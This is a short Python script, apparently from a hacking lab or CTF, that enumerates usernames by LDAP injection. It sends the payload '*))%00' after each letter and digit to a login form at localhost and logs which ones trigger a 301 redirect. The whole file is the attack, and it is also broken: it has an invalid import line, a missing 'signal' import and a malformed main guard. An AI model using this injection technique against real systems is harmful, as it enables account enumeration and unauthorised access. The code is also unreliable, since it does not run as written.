import requests,string,sys,os
import pwen from pwn

def def_handler(sig,frame):
    print("\n[!] Exiting...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def getInitials():
    url = "http://localhost:8888"
    characters = string.ascii_lowercase + string.digits
    users = []

    for c in characters:
        data = c+"*))%00"
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        response = requests.post(url, headers=headers, data=data, allow_redirects=False)

        if response.status_code == 301:
            users.append(c)

    return users

if __init__ == "__main__":
    users = getInitials()
    print("[*] Usuarios encontrados: ", users)
